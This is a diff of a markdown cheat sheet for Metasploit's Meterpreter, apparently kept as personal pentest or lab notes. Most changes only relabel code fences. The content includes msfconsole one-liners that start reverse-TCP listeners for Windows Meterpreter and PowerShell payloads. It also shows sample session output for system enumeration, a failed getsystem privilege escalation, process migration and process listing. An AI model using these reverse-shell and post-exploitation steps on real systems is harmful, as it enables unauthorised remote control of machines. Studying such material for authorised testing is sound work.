@@ -1,7 +1,7 @@
 # meterpreter
 
 ### TL;DR
-```
+```sh
 sysinfo
 getuid
 getsid
@@ -19,13 +19,14 @@ sessions
 
 ### One liner start meterpreter
 https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
-```
+```sh
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
 
 msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT 443;run;"
 
 msfconsole -x "use exploit/multi/handler;set payload windows/x64/powershell_reverse_tcp;set LHOST tun0; set LPORT 444;run;"
 ```
+
 ### 
 ```
 
@@ -38,7 +39,7 @@ msfconsole -x "use exploit/multi/handler;set payload windows/x64/powershell_reve
 ## Examples 
 
 ### sysinfo
-```
+```sh
 meterpreter > sysinfo
 Computer        : DEVEL
 OS              : Windows 7 (6.1 Build 7600).
@@ -51,20 +52,20 @@ meterpreter >
 ```
 
 ### getuid
-```
+```sh
 meterpreter > getuid
 Server username: IIS APPPOOL\Web
 meterpreter >
 ```
 
 ### getsid
-```
+```sh
 meterpreter > getsid
 Server SID: S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550
 ```
 
 ### getsystem
-```
+```sh
 meterpreter > getsystem 
 [-] priv_elevate_getsystem: Operation failed: 1726 The following was attempted:
 [-] Named Pipe Impersonation (In Memory/Admin)
@@ -77,14 +78,14 @@ meterpreter >
 ```
 
 ### getpid
-```
+```sh
 meterpreter > getpid
 Current pid: 1572
 meterpreter >
 ```
 
 ### migrate <to-new-PID>
-```
+```sh
 meterpreter > migrate 432
 [*] Migrating from 1572 to 432...
 ...
@@ -93,14 +94,14 @@ meterpreter >
 ```
 
 ### getpid
-```
+```sh
 meterpreter > getpid
 Current pid: 432
 meterpreter >
 ```
 
 ### ps <string-to-search>
-```
+```sh
 meterpreter > ps w3
 Filtering on 'w3'
 
@@ -113,7 +114,7 @@ Process List
 ```
 
 ### ps <string-to-search>
-```
+```sh
 meterpreter > ps win
 Filtering on 'win'
 
@@ -127,7 +128,7 @@ Process List
 ```
 
 ### ps -S <string-to-search>
-```
+```sh
 meterpreter > ps -S winlogon
 Filtering on 'winlogon'
 
@@ -140,7 +141,7 @@ Process List
 ```
 
 ### sessions
-```
+```sh
 msf6 exploit(multi/handler) > sessions 
 
 Active sessions
